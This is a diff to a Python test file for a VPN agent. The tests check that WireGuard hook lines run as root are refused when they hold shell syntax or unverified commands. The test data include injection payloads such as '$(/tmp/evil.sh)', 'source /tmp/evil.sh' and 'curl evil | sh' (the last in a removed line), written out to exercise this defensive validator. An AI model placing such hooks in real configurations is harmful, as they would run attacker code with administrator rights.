@@ -10,6 +10,7 @@ from __future__ import annotations
 import hashlib
 import os
 import stat
+import time
 import types
 from pathlib import Path
 
@@ -141,7 +142,7 @@ def test_execute_aborts_with_no_prompt_when_the_config_changed_after_confirmatio
     path = wg_conf(tmp_path)
     p = profile_for(path)
     confirmed = review("connect", p)
-    path.write_text(path.read_text().replace("Address", "PostUp = curl evil | sh\nAddress"))
+    path.write_text(path.read_text().replace("Address", "PostUp = /usr/bin/true\nAddress"))
     runner = Recorder()
     outcome = run("connect", p, runner, confirmed)
     assert outcome.ran is False and runner.scripts == []
@@ -260,9 +261,13 @@ def test_a_root_owned_hook_script_is_allowed(monkeypatch, tmp_path):
     assert r.allowed and r.root_hooks == ("PostUp: /usr/local/sbin/hook.sh up",)
 
 
-def test_an_inline_shell_hook_is_not_an_executable_path_check(tmp_path):
+def test_a_bare_hook_command_outside_the_system_folders_is_refused(tmp_path, monkeypatch):
+    """Second review of #32 (P1-2): a bare name wg-quick would find only in its own
+    (user-writable) folder, or not yet at all, could be created after the review."""
+    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: None)
     path = wg_conf(tmp_path, interface_extra="PostUp = iptables -A FORWARD -j ACCEPT\n")
-    assert review("connect", profile_for(path)).allowed      # protected by the config hash
+    r = review("connect", profile_for(path))
+    assert _blocked(r, "'iptables', which is not a program in /usr/bin, /bin, /usr/sbin, /sbin")
 
 
 def test_an_openvpn_up_script_in_a_user_directory_is_a_blocker(tmp_path):
@@ -656,22 +661,35 @@ def test_a_bare_hook_command_in_a_user_writable_path_directory_is_a_blocker(tmp_
                         lambda name, *a, **k: str(tmp_path / "wg-quick") if name == "wg-quick" else None)
     path = wg_conf(tmp_path, interface_extra="PostUp = helper --up\n")
     r = review("connect", profile_for(path))
-    assert _blocked(r, "helper") and any("resolves to" in b for b in r.blockers)
+    assert _blocked(r, "'helper', which is not a program in")
+    assert any("write plain commands with full paths" in b for b in r.blockers)
 
 
 def test_a_bare_hook_command_that_resolves_to_a_root_owned_program_is_accepted(tmp_path, monkeypatch):
-    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: "/usr/bin/true")
+    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: "/usr/bin/id")
     monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
-        "/usr/bin/true": (0, ROOT_FILE), "/usr/bin": (0, ROOT_DIR), "/usr": (0, ROOT_DIR),
+        "/usr/bin/id": (0, ROOT_FILE), "/usr/bin": (0, ROOT_DIR), "/usr": (0, ROOT_DIR),
         "/": (0, ROOT_DIR)}))
-    path = wg_conf(tmp_path, interface_extra="PostUp = true\n")
+    path = wg_conf(tmp_path, interface_extra="PostUp = id -u\n")
     assert review("connect", profile_for(path)).allowed
 
 
-def test_a_bare_hook_command_that_is_not_installed_is_left_alone(tmp_path, monkeypatch):
+def test_a_bare_hook_command_that_resolves_to_a_user_writable_program_is_refused(
+        tmp_path, monkeypatch):
+    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: "/usr/bin/id")
+    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
+        "/usr/bin/id": (501, ROOT_FILE), "/usr/bin": (0, ROOT_DIR), "/usr": (0, ROOT_DIR),
+        "/": (0, ROOT_DIR)}))
+    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = id\n")))
+    assert _blocked(r, "resolves to /usr/bin/id")
+
+
+def test_a_bare_hook_command_that_is_not_installed_is_refused(tmp_path, monkeypatch):
+    """P1-2: wg-quick's PATH ends in its own Homebrew folder, so a user can create
+    the program after the review."""
     monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: None)
-    path = wg_conf(tmp_path, interface_extra="PostUp = some-builtin-or-missing\n")
-    assert review("connect", profile_for(path)).allowed
+    path = wg_conf(tmp_path, interface_extra="PostUp = nosuchcmd-zz9\n")
+    assert _blocked(review("connect", profile_for(path)), "'nosuchcmd-zz9'")
 
 
 def test_a_link_into_a_user_writable_folder_is_unsafe(tmp_path, monkeypatch):
@@ -926,3 +944,245 @@ def test_a_link_reached_only_after_dotdot_is_checked(tmp_path, monkeypatch):
     monkeypatch.setattr(vpn_execution, "_stat", _only_writable(T))
     reason = vpn_execution._unsafe_executable_reason(S / "p")
     assert reason is not None and str(T) in reason
+
+
+# ── second review of #32: plain commands with full paths (owner, 2026-11-06) ──
+# wg-quick runs each hook through bash's eval as root. A hook bash would read
+# differently from the review's literal words is refused outright.
+
+PLAIN_RULE = "Tunnel cannot check what this hook runs; write plain commands with full paths."
+
+
+@pytest.mark.parametrize("hook", [
+    "echo $(/tmp/evil.sh)", "${CONFIG_FILE%/*}/up.sh", "sh</tmp/evil.sh", "/tm\"p\"/evil.sh",
+    "/t\\mp/evil.sh", "/{tmp,x}/evil.sh", "/tm?/evil.sh", "/tm*/evil.sh", "/tm[p]/evil.sh",
+    "`/tmp/evil.sh`", "'/tmp/evil.sh'", "~/evil.sh", "/usr/bin/true && (/tmp/evil.sh)",
+    "/usr/bin/true | /bin/sh", "/bin/cat /etc/hosts > /tmp/x", "/usr/bin/true |& /bin/sh",
+    ". /tmp/evil.sh", "source /tmp/evil.sh", "eval /tmp/evil.sh", "exec /tmp/evil.sh",
+    "builtin source /tmp/evil.sh", "command /tmp/evil.sh", "! /tmp/evil.sh",
+    "{ /tmp/evil.sh; }", "if /usr/bin/true; then :; fi", "time /tmp/evil.sh",
+    "cmd /tmp/evil.sh", "echo hi", "PATH=/tmp ls", "PATH=/tmp; ls", "./evil.sh",
+    "bin/evil.sh", "hook-%I", "up:zz", "nosuchcmd-zz9", "/usr/bin/true\v/tmp/x",
+    "/bin/sh -c id", "/usr/bin/python3 -m evil", "/usr/bin/perl -e1", "/usr/bin/env -Sls",
+    "/bin/sh %I", "/usr/bin/env /bin/sh -c foo", "/usr/bin/find /etc -exec rm",
+])
+def test_a_hook_with_shell_syntax_or_an_unchecked_command_is_refused(tmp_path, hook):
+    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
+    assert not r.allowed
+    assert any(PLAIN_RULE in b and "The PostUp hook" in b for b in r.blockers), r.blockers
+
+
+@pytest.mark.parametrize("hook", ["echo $(/tmp/evil.sh)", ". /tmp/evil.sh", "nosuchcmd-zz9"])
+def test_the_same_hooks_on_disconnect_are_risks_not_blockers(tmp_path, hook):
+    path = wg_conf(tmp_path, "wgd", interface_extra=f"PostDown = {hook}\n")
+    r = review("disconnect", profile_for(path), Probe(up={"wgd"}))
+    assert r.allowed and any(PLAIN_RULE in item for item in r.risks)
+
+
+def test_the_refusal_names_what_bash_would_read_differently(tmp_path):
+    def blockers(hook):
+        r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
+        return " ".join(r.blockers)
+    assert "the shell character '$'" in blockers("echo $(/tmp/evil.sh)")
+    assert "uses 'source', which bash runs itself" in blockers("source /tmp/evil.sh")
+    assert "sets PATH for its command" in blockers("PATH=/tmp ls")
+    assert "not a full path" in blockers("./evil.sh")
+    assert "'hook-%I', which is not a plain program name" in blockers("hook-%I")
+    assert "hands 'id' to /bin/sh" in blockers("/bin/sh -c id")
+    assert "control character" in blockers("/usr/bin/true\x01")
+
+
+@pytest.mark.parametrize("char", list("$`\\'\"*?[]{}<>()!~|"))      # written out: not read from the module
+def test_every_shell_character_is_refused_on_its_own(tmp_path, char):
+    r = review("connect", profile_for(wg_conf(
+        tmp_path, interface_extra=f"PostUp = /usr/bin/true a{char}b\n")))
+    assert _blocked(r, f"uses the shell character '{char}'")
+
+
+@pytest.mark.parametrize("word", [".", "source", "eval", "exec", "builtin", "command", "if",
+                                  "time", "cmd", "execute_hooks", "echo", "true", "test",
+                                  "kill", "hash", "enable", "trap", "export", "cd"])
+def test_a_shell_word_is_refused_even_when_a_program_of_that_name_exists(
+        tmp_path, monkeypatch, word):
+    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: "/usr/bin/" + name)
+    monkeypatch.setattr(vpn_execution, "_unsafe_executable_reason", lambda path: None)
+    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {word} /x\n")))
+    assert _blocked(r, f"uses '{word}', which bash runs itself")
+
+
+def test_separated_plain_commands_are_allowed_and_each_one_is_checked(tmp_path):
+    plain = "/usr/bin/true; /usr/bin/true && /usr/bin/true || /usr/bin/true & /usr/bin/true"
+    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {plain}\n")))
+    assert r.allowed, r.blockers
+    script = _user_script(tmp_path)
+    r = review("connect", profile_for(wg_conf(
+        tmp_path, "wg2", interface_extra=f"PostUp = /usr/bin/true || {script} up\n")))
+    assert _blocked(r, f"runs {script} as administrator")
+    assert not any(PLAIN_RULE in b for b in r.blockers)       # judged as a path, not as syntax
+
+
+def test_a_comment_after_a_blank_ends_the_hook_as_bash_reads_it(tmp_path):
+    hook = "/usr/bin/true # was: curl $URL | sh"
+    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
+    assert r.allowed and r.root_hooks == (f"PostUp: {hook}",)
+
+
+def test_a_script_given_to_a_shell_may_take_plain_arguments(tmp_path, monkeypatch):
+    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
+        "/etc/wireguard/up.sh": (0, ROOT_FILE), "/etc/wireguard": (0, ROOT_DIR),
+        "/etc": (0, ROOT_DIR), "/bin/sh": (0, ROOT_FILE), "/bin": (0, ROOT_DIR),
+        "/": (0, ROOT_DIR)}))
+    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))   # no links anywhere
+    hook = "/bin/sh -e /etc/wireguard/up.sh %i up 2"
+    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=f"PostUp = {hook}\n")))
+    assert r.allowed, r.blockers
+
+
+def test_a_placeholder_path_handed_to_an_interpreter_is_refused(tmp_path):
+    """P3-4: the %i/%I check also applies past the first word."""
+    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = sh /etc/wireguard/%I.up\n")))
+    assert _blocked(r, "%i and %I") and any("/etc/wireguard/%I.up" in b for b in r.blockers)
+
+
+def test_a_bare_hook_key_shows_the_line_itself_as_its_command(tmp_path):
+    """P3-4: wg-quick runs the bare "PreUp" line as a command; it is not empty."""
+    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PreUp\n")))
+    assert r.root_hooks == ("PreUp: PreUp",)
+
+
+def test_a_normal_config_with_plain_full_path_hooks_is_still_allowed(tmp_path):
+    """False-positive check: Interface, Peer, DNS and plain system-program hooks."""
+    extra = ("DNS = 10.64.0.1, 10.64.0.2 # resolver\n"
+             "PostUp = /usr/sbin/networksetup -setdnsservers Wi-Fi 10.64.0.1\n"
+             "PostDown = /sbin/route -n delete -inet 10.0.0.0/8 -interface %i\n")
+    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=extra)))
+    assert r.allowed and r.blockers == ()
+    assert not any("could replace" in w or "hands" in w or PLAIN_RULE in w
+                   for w in r.warnings), r.warnings
+    assert "DNS: 10.64.0.1, 10.64.0.2" in r.config_lines
+
+
+# ── P1-2 / P3-3: bare names are looked up where wg-quick looks first ────────
+
+def test_bare_names_are_found_only_in_the_system_folders_in_wg_quicks_order(tmp_path, monkeypatch):
+    assert vpn_execution._PRIVILEGED_PATH == ("/usr/bin", "/bin", "/usr/sbin", "/sbin")
+    own = tmp_path / "helper"
+    own.write_text("#!/bin/sh\n")
+    own.chmod(0o755)
+    monkeypatch.setattr(vpn_execution.shutil, "which",
+                        lambda name, *a, **k: str(tmp_path / "wg-quick"))
+    assert vpn_execution._which_privileged("helper") is None   # wg-quick's own folder: not trusted
+    assert vpn_execution._which_privileged("ls") in ("/usr/bin/ls", "/bin/ls")
+
+
+def test_the_review_does_not_look_up_wg_quick_per_command(tmp_path, monkeypatch):
+    calls = []
+    monkeypatch.setattr(vpn_execution.shutil, "which",
+                        lambda name, *a, **k: calls.append(name))
+    vpn_execution._hook_findings("PostUp = " + "/usr/bin/true; " * 50 + "\n", "WireGuard")
+    assert calls == []
+
+
+# ── P3-2: the hook check has a ceiling, and stays fast up to it ─────────────
+
+def test_a_config_full_of_tiny_commands_is_refused_quickly(tmp_path):
+    line = "PostUp = " + "a;" * 1990 + "\n"
+    path = wg_conf(tmp_path, interface_extra=line * 65)
+    assert path.stat().st_size <= vpn_execution.CONFIG_READ_LIMIT
+    start = time.monotonic()
+    r = review("connect", profile_for(path))
+    assert time.monotonic() - start < 1.0
+    assert _blocked(r, f"more than {vpn_execution.HOOK_CHECK_LIMIT} commands and paths")
+    assert len(r.blockers) <= vpn_execution.HOOK_CHECK_LIMIT + 5
+
+
+def test_a_config_full_of_paths_is_refused_quickly(tmp_path):
+    line = "PostUp = /usr/bin/true " + "/a " * 1300 + "\n"
+    path = wg_conf(tmp_path, interface_extra=line * 60)
+    start = time.monotonic()
+    r = review("connect", profile_for(path))
+    assert time.monotonic() - start < 1.0
+    assert _blocked(r, "commands and paths")
+
+
+def test_the_ceiling_is_exact(tmp_path):
+    each = "PostUp = /usr/bin/true\n"                 # one command and one path: two checks
+    bare = "PostUp = id\n"                            # one command, no path: one check
+    half = vpn_execution.HOOK_CHECK_LIMIT // 2
+    at = review("connect", profile_for(wg_conf(
+        tmp_path, "wga", interface_extra=each * (half - 1) + bare * 2)))
+    over = review("connect", profile_for(wg_conf(
+        tmp_path, "wgb", interface_extra=each * half + bare)))
+    assert at.allowed, at.blockers
+    assert _blocked(over, "commands and paths")
+
+
+# ── P3-1: a path that cannot be looked at is unsafe, not skipped ────────────
+
+def test_a_folder_stat_refuses_with_eacces_is_unsafe(monkeypatch):
+    import errno as _errno
+
+    def stat_(path, *a, **k):
+        if str(path) == "/opt/locked":
+            raise PermissionError(_errno.EACCES, "Permission denied", str(path))
+        if str(path).startswith("/opt/locked/"):
+            raise FileNotFoundError(_errno.ENOENT, "No such file", str(path))
+        return types.SimpleNamespace(st_uid=0, st_mode=ROOT_DIR)
+    monkeypatch.setattr(vpn_execution, "_stat", stat_)
+    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))
+    reason = vpn_execution._unsafe_executable_reason(Path("/opt/locked/hook.sh"))
+    assert reason is not None and "/opt/locked could not be checked" in reason
+
+
+def test_a_missing_file_is_still_judged_by_its_folders(monkeypatch):
+    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({"/opt": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
+    monkeypatch.setattr(vpn_execution, "_lstat", _fake_stat({}))
+    assert vpn_execution._unsafe_executable_reason(Path("/opt/x/hook.sh")) is None
+
+
+def test_a_link_walk_that_cannot_look_at_a_folder_is_unsafe(monkeypatch):
+    import errno as _errno
+
+    def lstat_(path, *a, **k):
+        if str(path) == "/opt/locked":
+            raise PermissionError(_errno.EACCES, "Permission denied", str(path))
+        raise FileNotFoundError(_errno.ENOENT, "No such file", str(path))
+    monkeypatch.setattr(vpn_execution, "_stat", lambda p, *a, **k: types.SimpleNamespace(
+        st_uid=0, st_mode=ROOT_DIR))
+    monkeypatch.setattr(vpn_execution, "_lstat", lstat_)
+    reason = vpn_execution._unsafe_executable_reason(Path("/opt/locked/hook.sh"))
+    assert reason is not None and "could not be resolved" in reason
+
+
+# ── P2-1: the DNS the review shows is the DNS wg-quick sets ─────────────────
+
+def _inspect(body):
+    from agents.vpn_agent.services.config_inspection import inspect_wireguard_text
+    return inspect_wireguard_text("[Interface]\nAddress = 10.8.0.2/32\n" + body
+                                  + "[Peer]\nAllowedIPs = 0.0.0.0/0\n", Path("x.conf"))
+
+
+def test_a_dns_key_cut_off_by_a_comment_sets_no_dns():
+    s = _inspect("DNS # = 10.64.0.1\n")
+    assert s.dns_servers == ()
+    assert any("'=' comes after a '#'" in w for w in s.warnings)
+
+
+def test_a_comment_after_a_dns_value_is_not_part_of_it():
+    assert _inspect("DNS = 10.64.0.1 # resolver\n").dns_servers == ("10.64.0.1",)
+
+
+def test_a_unicode_line_separator_does_not_create_a_dns_entry():
+    assert _inspect("MTU = 1420 DNS = 10.64.0.1\n").dns_servers == ()
+
+
+def test_a_section_header_with_a_comment_still_counts_its_peer():
+    from agents.vpn_agent.services.config_inspection import inspect_wireguard_text
+    s = inspect_wireguard_text("[Interface]\nAddress = 10.8.0.2/32\n[Peer] # home\n"
+                               "AllowedIPs = 0.0.0.0/0\n", Path("x.conf"))
+    assert s.peer_count == 1 and s.allowed_ips == ("0.0.0.0/0",)
+
+
+def test_the_review_says_system_dns_stays_when_dns_is_cut_off(tmp_path):
+    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="DNS # = 10.64.0.1\n")))
+    assert "DNS: Not specified — system DNS stays in use" in r.config_lines
